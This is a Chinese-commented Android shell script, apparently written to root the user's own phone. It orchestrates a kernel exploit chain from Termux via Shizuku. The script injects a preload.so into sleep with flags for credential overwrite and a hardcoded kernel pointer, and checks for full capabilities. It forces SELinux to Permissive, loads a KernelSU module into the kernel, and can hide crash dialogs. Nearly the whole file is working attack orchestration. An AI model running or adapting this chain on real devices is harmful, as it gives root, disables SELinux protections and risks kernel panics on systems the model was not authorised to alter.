#!/system/bin/sh
# ============================================================
# matisse KSU 落地流程 (land v1, 2026-09-13)
#
# 目的: 用一段可读、可判定、可恢复的流程完成一次"落地"——
#       R 落地 -> permissive 窗口 -> 单发 C -> 模块装入 -> 还原。
#
# 与既有 ksu_persist.sh 的差别 (都是这次对话里查出来的问题):
#   1. R 落地判据收紧: CapEff 满 + 心跳新鲜 + boot_id 未变, 三者缺一即 miss
#      (旧脚本"含 task= 就算落地"会把半写/陈旧状态当落地 -> 拿坏指针打 C -> panic)
#   2. 开火自证: 每轮确认输出文件真的产生, 否则记 R_NOT_FIRED, 不计入命中率
#      (历史上两次"没开火却输出 miss": rsh1 未定义 / PSELECT_TASK 位置错)
#   3. 新鲜 boot 是主门: uptime > ${FRESH_MAX}s 直接拒绝 (旧脚本只有 600s 下限)
#   4. load 只记录不设门 (历史数据: 基线 16-17, 而软重启发生在 16.7, 门无区分度)
#   5. 默认不推送任何日志到远端 (旧脚本会自动 push 到 gitee)
#   6. 可选跑前整备 COND=1: kill-all / 关动画 / 藏崩溃弹窗 / stayon / 免电池优化
#   7. G1 心跳新鲜, G2 轮次间隔 >=${SPACING}s, G3 每 R 窗口只打 1 发 C
#
# 用法 (Termux):
#   bash ~/matisse_land.sh                 # 只取证据, 不装 KO
#   ALLOW_KO=1 bash ~/matisse_land.sh      # 授权装填 KO (需要用户明确同意)
#   COND=1 bash ~/matisse_land.sh          # 先做跑前整备, 结束后自动还原
#   RMAX=3 SPACING=200 bash ~/matisse_land.sh
#   CHECK=1 bash ~/matisse_land.sh         # 只跑体检/取证/弹药校验, 绝不开火
#   PUSH=1 bash ~/matisse_land.sh          # 显式要求才回传 git (默认关闭)
#
# 产物: 终端输出 + /data/local/tmp/land_<时间戳>.card + 可选 git 回传
# ============================================================
set -u

FRESH_MAX="${FRESH_MAX:-3600}"      # 新鲜 boot 上限(秒); 超过直接拒绝
RMAX="${RMAX:-6}"                   # 同 boot 最多 R 掷数
SPACING="${SPACING:-200}"           # G2: 轮次最小间隔(秒)
COND="${COND:-0}"                   # 跑前整备
ALLOW_KO="${ALLOW_KO:-${HUNT_ALLOW_KO:-0}}"
PUSH="${PUSH:-0}"
CHECK="${CHECK:-0}"                 # 1=只体检, 不开火
RISH_CANDIDATES="$HOME/rish $HOME/rish/rish /sdcard/Download/rish /storage/emulated/0/Download/rish /data/local/tmp/rish"

RUN_TS=$(date +%Y%m%d_%H%M%S)
LOG=/data/local/tmp/land_${RUN_TS}.log
CARD=/data/local/tmp/land_${RUN_TS}.card

say(){ echo "[land] $*"; }
need(){ command -v "$1" >/dev/null 2>&1; }

# ── rish 层 ──────────────────────────────────────────────────
RISH=""
for c in $RISH_CANDIDATES; do
  [ -f "$c" ] && { RISH="$c"; break; }
done
if [ -z "$RISH" ]; then
  say "!! 找不到 rish。请在 Shizuku 应用里复制 rish(和 rish_shizuku.dex) 到 ~/"
  exit 2
fi
RISH_DIR=$(dirname "$RISH")
chmod +x "$RISH" 2>/dev/null

RISH_MODE=""
for m in c stdin args; do
  i=1
  while [ "$i" -le 3 ]; do
    case "$m" in
      c)     OUT=$( (cd "$RISH_DIR" && timeout 25 ./rish -c 'echo RISH_OK_$(id -u)' </dev/null) 2>&1 ) ;;
      args)  OUT=$( (cd "$RISH_DIR" && timeout 25 ./rish 'echo RISH_OK_$(id -u)') 2>&1 ) ;;
      *)     OUT=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 25 ./rish) 2>&1 ) ;;
    esac
    case "$OUT" in *RISH_OK_*) RISH_MODE="$m"; break 2 ;; esac
    i=$((i + 1))
    sleep 5
  done
done
if [ -z "$RISH_MODE" ]; then
  say "!! rish 不可用 (Shizuku 未运行/被冻结)。"
  say "   设置->应用->Termux 与 Shizuku->省电策略[无限制]; 插电亮屏后重试。"
  say "   last=[$(printf '%s' "$OUT" | head -c 120)]"
  exit 2
fi
say "rish 模式=$RISH_MODE 身份=$(printf '%s' "$OUT" | tr '\n' ' ')"

rish_raw(){ # rish_raw <cmd> <timeout>
  case "$RISH_MODE" in
    c)    (cd "$RISH_DIR" && timeout "$2" ./rish -c "$1" </dev/null) 2>&1 ;;
    args) (cd "$RISH_DIR" && timeout "$2" ./rish "$1") 2>&1 ;;
    *)    printf '%s\n' "$1" | (cd "$RISH_DIR" && timeout "$2" ./rish) 2>&1 ;;
  esac
}
rsh(){ # 带闪断重试; 失败返回 1 且输出原文
  _i=1
  while [ "$_i" -le 4 ]; do
    OUT=$(rish_raw "$1" "${2:-60}")
    case "$OUT" in
      *"Request timeout"*|*"blocked by your system"*) ;;
      *) printf '%s\n' "$OUT"; return 0 ;;
    esac
    [ "$_i" -lt 4 ] && sleep 8
    _i=$((_i + 1))
  done
  printf '%s\n' "$OUT"
  return 1
}
rsh_q(){ rsh "$1" "${2:-20}" | tr -d '\r\n'; }   # 取单值

# ── 0. 体检 + 主门 ───────────────────────────────────────────
BOOT0=$(rish_raw 'cat /proc/sys/kernel/random/boot_id' 20 | tr -d '\r\n')
case "$BOOT0" in
  [0-9a-f]*-*) ;;
  *) say "!! boot_id 读取失败: [$BOOT0] — Shizuku 不稳"; exit 2 ;;
esac
ENF0=$(rsh_q 'getenforce')
UP0=$(rsh_q "awk '{print int(\$1)}' /proc/uptime")
LOAD0=$(rsh_q 'cat /proc/loadavg')
MEM0=$(rsh_q "free -m 2>/dev/null | awk '/Mem:/{print \$7\"MB avail\"}'")
say "体检: boot=${BOOT0%${BOOT0#????????}} enforce=$ENF0 uptime=${UP0}s load=$LOAD0 mem=$MEM0"

case "$UP0" in
  ''|*[!0-9]*) say "!! uptime 不可读, 拒绝开火 (无法判断 boot 新鲜度)"; exit 4 ;;
esac
if [ "$UP0" -gt "$FRESH_MAX" ]; then
  say "!! uptime ${UP0}s > ${FRESH_MAX}s — 老 boot 不开火 (09-13 ANR 就发生在 63h boot)"
  say "   硬重启手机 -> 开机后 1 小时内重跑本脚本。"
  exit 4
fi
if [ "$ENF0" != "Enforcing" ]; then
  say "!! 起始 enforce=$ENF0 (期望 Enforcing) — 状态不干净, 先重启"
  exit 4
fi

# ── 1. 可选: 跑前整备 ────────────────────────────────────────
RESTORE=0
if [ "$COND" = "1" ]; then
  say "整备: kill-all / 关动画 / 藏崩溃弹窗 / stayon / 免电池优化"
  rsh 'am kill-all' 60 >/dev/null 2>&1
  rsh 'settings put global hide_error_dialogs 1' 20 >/dev/null 2>&1
  rsh 'settings put global window_animation_scale 0; settings put global transition_animation_scale 0; settings put global animator_duration_scale 0' 30 >/dev/null 2>&1
  rsh 'svc power stayon true' 20 >/dev/null 2>&1
  rsh 'cmd deviceidle whitelist +com.termux +moe.shizuku.privileged.api' 30 >/dev/null 2>&1
  rsh 'cmd appops set moe.shizuku.privileged.api RUN_IN_BACKGROUND allow; cmd appops set com.termux RUN_IN_BACKGROUND allow' 30 >/dev/null 2>&1
  RESTORE=1
  # 整备后再取一次基线(整备本身会改 load)
  LOAD0=$(rsh_q 'cat /proc/loadavg')
  say "整备后 load=$LOAD0 (只记录, 不设门)"
fi

# ── 2. 残留取证: 脏设备不开火 ────────────────────────────────
RES=$(rish_raw 'for p in $(pgrep -x sleep 2>/dev/null); do for t in /proc/$p/task/*; do cat $t/wchan 2>/dev/null; done; done' 60 | tr -d '\r' | grep -c . )
say "残留检查: sleeper 线程=$RES"
if [ "${RES:-0}" -gt 0 ]; then
  say "!! 有残留轮次进程 — 请硬重启手机后重跑 (不在脏设备上开火)"
  exit 5
fi

# ── 3. 弹药校验 ──────────────────────────────────────────────
SHA_SO=$(rsh_q 'sha256sum /data/local/tmp/preload.so 2>/dev/null' | awk '{print $1}')
if [ -z "$SHA_SO" ]; then
  say "!! /data/local/tmp/preload.so 不存在 — 先用 rish 推送 mt87"
  exit 3
fi
say "preload.so sha256=${SHA_SO%${SHA_SO#????????????????}}"
KOFLAG=""
if [ "$ALLOW_KO" = "1" ]; then
  SHA_KO=$(rsh_q 'sha256sum /data/local/tmp/kernelsu_gki209.ko 2>/dev/null' | awk '{print $1}')
  if [ -n "$SHA_KO" ]; then
    KOFLAG="PSELECT_KO=/data/local/tmp/kernelsu_gki209.ko"
    say "KO 已武装 sha256=${SHA_KO%${SHA_KO#????????????????}}"
  else
    say "!! ALLOW_KO=1 但 /data/local/tmp/kernelsu_gki209.ko 不存在 — 本轮无 KO"
  fi
fi

if [ "$CHECK" = "1" ]; then
  say "CHECK=1: 体检/取证/弹药校验完成, 未开火。"
  say "  boot=${BOOT0%${BOOT0#????????}} enforce=$ENF0 uptime=${UP0}s (上限 ${FRESH_MAX}s)"
  say "  preload sha=${SHA_SO}"
  [ -n "$KOFLAG" ] && say "  KO 已就绪" || say "  KO 未武装 (ALLOW_KO=1 才装填)"
  say "  去掉 CHECK=1 即可正式开火。"
  exit 0
fi

# ── 4. 开火原语 (env 在重定向前; 这是历史 bug 的位置) ────────
R_ENV="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1"
E5_ENV="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1"
E5R_ENV="$E5_ENV PSELECT_SELINUX_ENF_VALUE=SPRAY1"

fire(){ # fire <name> <env> [task]
  _n=$1; _e=$2; _t=${3:-}
  [ -n "$_t" ] && _e="$_e PSELECT_TASK=$_t"
  _cmd="rm -f /data/local/tmp/$_n.out; timeout 250 env $_e $KOFLAG LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$_n.out 2>&1"
  say "开火 $_n (~4-5 分钟, 勿动手机, 保持亮屏)"
  rish_raw "$_cmd" 280 >/dev/null 2>&1
}
fired_ok(){ # 开火自证: 输出文件存在且非空
  _n=$1
  _sz=$(rsh_q "wc -c < /data/local/tmp/$_n.out 2>/dev/null" | tr -dc '0-9')
  case "$_sz" in ''|0) return 1 ;; *) return 0 ;; esac
}
hb_fresh(){ # G1: 心跳 <30s
  _now=$(rsh_q 'date +%s'); _mt=$(rsh_q 'stat -c %Y /data/local/tmp/mt49_child_status.txt 2>/dev/null')
  case "$_now$_mt" in ''|*[!0-9]*) return 1 ;; esac
  [ $((_now - _mt)) -le 30 ]
}
bootid_now(){ rsh_q 'cat /proc/sys/kernel/random/boot_id'; }
rgate(){ # 严格 R 判据: CapEff 满 + 心跳新鲜 + boot 未变
  _st=$(rish_raw 'cat /data/local/tmp/mt49_child_status.txt 2>/dev/null' 30 | tr -d '\r')
  case "$_st" in
    *"CapEff=000001ffffffffff"*) ;;
    *) echo "R_MISS"; return ;;
  esac
  hb_fresh || { echo "R_STALE"; return; }
  [ "$(bootid_now)" = "$BOOT0" ] || { echo "R_REBOOTED"; return; }
  echo "R_LANDED"
}
task_of(){ rish_raw 'cat /data/local/tmp/mt49_child_status.txt' 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
cleangate(){
  rsh 'pkill -9 -x sleep 2>/dev/null; rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt' 30 >/dev/null 2>&1
  _left=$(rsh_q 'ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l' | tr -dc '0-9')
  [ "${_left:-1}" = "0" ]
}

# ── 5. R 轮: 同 boot 重掷, 每轮固定间隔 ──────────────────────
TASK=""; LNAME=""; R_VERDICT="NONE"; NOT_FIRED=0
rr=1
while [ "$rr" -le "$RMAX" ]; do
  say "── R 掷 $rr/$RMAX ──"
  T0=$(date +%s)
  if ! cleangate; then
    say "!! 门槛文件清理失败 — 跳过本轮 (不用陈旧状态赌博)"
    rr=$((rr + 1)); continue
  fi
  fire "R$rr" "$R_ENV"
  if ! fired_ok "R$rr"; then
    say "R$rr: R_NOT_FIRED (命令未真正开火, 不计入命中率)"
    NOT_FIRED=$((NOT_FIRED + 1))
  else
    G=$(rgate)
    say "R$rr: $G"
    case "$G" in
      R_LANDED)
        TASK=$(task_of); LNAME="R$rr"; R_VERDICT="$G"
        say "R 落地: task=$TASK ($LNAME)"
        break ;;
      R_REBOOTED)
        say "!! 设备已重启 (boot_id 变化) — 中止, 重跑"
        exit 6 ;;
    esac
  fi
  # G2: 轮次间隔
  EL=$(( $(date +%s) - T0 ))
  [ "$EL" -lt "$SPACING" ] && { say "间隔 ${SPACING}s (确保上一轮彻底退场)"; sleep $((SPACING - EL)); }
  rr=$((rr + 1))
done
if [ "$R_VERDICT" != "R_LANDED" ]; then
  say "!! 本 boot $RMAX 发 R 未落地 (未开火 $NOT_FIRED 发)"
  say "   硬重启后重跑: bash ~/matisse_land.sh"
  exit 5
fi

# ── 6. permissive 窗口 ───────────────────────────────────────
E5OK=0; e=1
while [ "$e" -le 5 ]; do
  say "── E5 窗口 尝试 $e/5 ──"
  fire "E5$e" "$E5_ENV"
  EF=$(rsh_q 'getenforce')
  say "E5$e 后 enforce=$EF"
  case "$EF" in
    Permissive) E5OK=1; break ;;
    *timeout*|*"not running"*) say "rish 掉线, 等 30s 再判"; sleep 30 ;;
  esac
  e=$((e + 1))
done
if [ "$E5OK" != "1" ]; then
  say "!! 未取得 permissive — 不打 C (不打没准备的仗)"
  exit 7
fi

# ── 7. 单发 C (G3) ──────────────────────────────────────────
C_VERDICT="C_NOT_FIRED"
if hb_fresh && [ "$(bootid_now)" = "$BOOT0" ]; then
  say "── C 单发 (task=$TASK) ──"
  C_ENV="$R_ENV PSELECT_PTR_STAGE=C"
  fire "C1" "$C_ENV" "$TASK"
  if fired_ok "C1"; then
    C_VERDICT="C_FIRED"
  else
    say "C1: C_NOT_FIRED (未真正开火)"
  fi
  KSU=0; w=0
  while [ "$w" -lt 44 ]; do
    sleep 5
    KSU=$(rsh_q 'grep -c ^ksu /proc/modules 2>/dev/null' | tr -dc '0-9')
    [ "${KSU:-0}" -ge 1 ] && { say "KSU 已在 /proc/modules"; break; }
    RA=$(rsh_q 'head -1 /data/local/tmp/root_alive.txt 2>/dev/null')
    [ -n "$RA" ] && say "root_alive=[$RA]"
    w=$((w + 1))
  done
else
  say "!! child 心跳陈旧或设备重启 — C 不击 (G1)"
  KSU=0
fi

# ── 8. 还原 + 判定 ──────────────────────────────────────────
if [ "$(rsh_q 'getenforce')" = "Permissive" ]; then
  say "还原 enforcing..."
  fire "E5R1" "$E5R_ENV"
  say "E5R 后 enforce=$(rsh_q 'getenforce')"
fi
if [ "$RESTORE" = "1" ]; then
  rsh 'settings put global hide_error_dialogs 0' 20 >/dev/null 2>&1
  rsh 'settings put global window_animation_scale 1; settings put global transition_animation_scale 1; settings put global animator_duration_scale 1' 30 >/dev/null 2>&1
  say "整备设置已还原"
fi

KSU=${KSU:-0}
RA_YES=no
RA_TXT=$(rsh_q 'head -1 /data/local/tmp/root_alive.txt 2>/dev/null')
[ -n "$RA_TXT" ] && RA_YES=yes
HOST=$(rsh_q 'uname -n')
{
  echo "# matisse land $RUN_TS"
  echo "boot=$BOOT0 uptime0=${UP0}s load0=$LOAD0 mem0=$MEM0"
  echo "R=$R_VERDICT round=$LNAME task=$TASK not_fired=$NOT_FIRED"
  echo "E5=permissive_ok C=$C_VERDICT ksu_module=$KSU root_alive=$RA_YES hostname=$HOST"
  echo "preload_sha256=$SHA_SO ko_armed=$([ -n "$KOFLAG" ] && echo yes || echo no)"
  echo "# 证据: ksu(/proc/modules)=$KSU  root_alive.txt=$RA_YES"
  echo "# 线索(非结论): hostname=$HOST  (仅供参考)"
} > "$CARD"

say "──────────────── 判定 ────────────────"
say "R: $R_VERDICT ($LNAME task=$TASK)   未开火轮次: $NOT_FIRED"
say "C: $C_VERDICT    KSU 模块: $KSU    root_alive: $RA_YES"
say "卡片: $CARD"
if [ "${KSU:-0}" -ge 1 ]; then
  say "★★★ 落地成功: 内核模块已装入, su 可用 ★★★"
elif [ "$RA_YES" = "yes" ]; then
  say "★ C 已落地 (root_alive 证据), 但模块未装入 — 看 C1.out / dmesg"
else
  say "本轮未落地。硬重启后重跑: bash ~/matisse_land.sh"
fi

# ── 9. 可选回传 (默认关闭) ──────────────────────────────────
if [ "$PUSH" = "1" ]; then
  say "PUSH=1: 回传卡片与日志到 git"
  WORK="$HOME/matisse"
  if [ -d "$WORK/.git" ]; then
    mkdir -p "$WORK/logs_raw/land_$RUN_TS"
    cp "$CARD" "$WORK/logs_raw/land_$RUN_TS/" 2>/dev/null
    for n in R1 R2 R3 R4 R5 R6 E5a E5b C1 E5R1; do
      rish_raw "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/land_$RUN_TS/${n}.out" 2>/dev/null
      [ -s "$WORK/logs_raw/land_$RUN_TS/${n}.out" ] || rm -f "$WORK/logs_raw/land_$RUN_TS/${n}.out"
    done
    (cd "$WORK" && git add -A >/dev/null 2>&1 && git commit -q -m "land $RUN_TS: R=$R_VERDICT C=$C_VERDICT ksu=$KSU root_alive=$RA_YES" >/dev/null 2>&1; git push -q origin master 2>/dev/null) && say "已推送" || say "推送失败"
  else
    say "!! 找不到 $WORK 仓库, 跳过"
  fi
fi
